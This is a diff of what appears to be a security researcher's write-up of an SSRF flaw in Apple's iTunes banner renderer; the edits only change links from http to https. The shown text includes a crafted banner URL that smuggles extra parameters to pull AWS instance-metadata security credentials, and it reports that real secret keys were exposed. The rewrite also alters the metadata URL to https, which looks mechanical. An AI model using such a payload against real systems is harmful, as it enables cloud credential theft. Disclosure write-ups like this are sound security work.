@@ -666,11 +666,11 @@ From here we made the assumption that they were using a headerless browser clien
 
 The first thing we noticed was in the request log when it hit our server:
 
-    54.210.212.22 - - [21/Aug/2020:15:54:07 +0000] "GET /imgapple.js?_=1598025246686 HTTP/1.1" 404 3901 "http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&t=catalog_white&c=us&l=en-US&id=1528672619&w=300&h=250&store=books&cache=false" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
+    54.210.212.22 - - [21/Aug/2020:15:54:07 +0000] "GET /imgapple.js?_=1598025246686 HTTP/1.1" 404 3901 "https://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&t=catalog_white&c=us&l=en-US&id=1528672619&w=300&h=250&store=books&cache=false" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
 
 This is the S3 bucket / image it was hitting to generate the picture:
 
-    http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&t=catalog_white&c=us&l=en-US&id=1528672619&w=300&h=250&store=books&cache=false
+    https://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&t=catalog_white&c=us&l=en-US&id=1528672619&w=300&h=250&store=books&cache=false
 
 And this is the User-Agent:
 
@@ -688,7 +688,7 @@ The first thing was to write our JS XSS payload to perform Server-Side Request F
 
 Since we know this on AWS, we attempt to hit AWS metadata URI:
 
-    https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&t=catalog_black&c=us&l=en-US&id=1528672619%26cachebust=12345%26url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance%26&w=800&h=800&store=books&cache=false
+    https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&t=catalog_black&c=us&l=en-US&id=1528672619%26cachebust=12345%26url=https://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance%26&w=800&h=800&store=books&cache=false
 
 This rendered a new banner image with the full AWS secret keys for an ec2 and iam role:
 
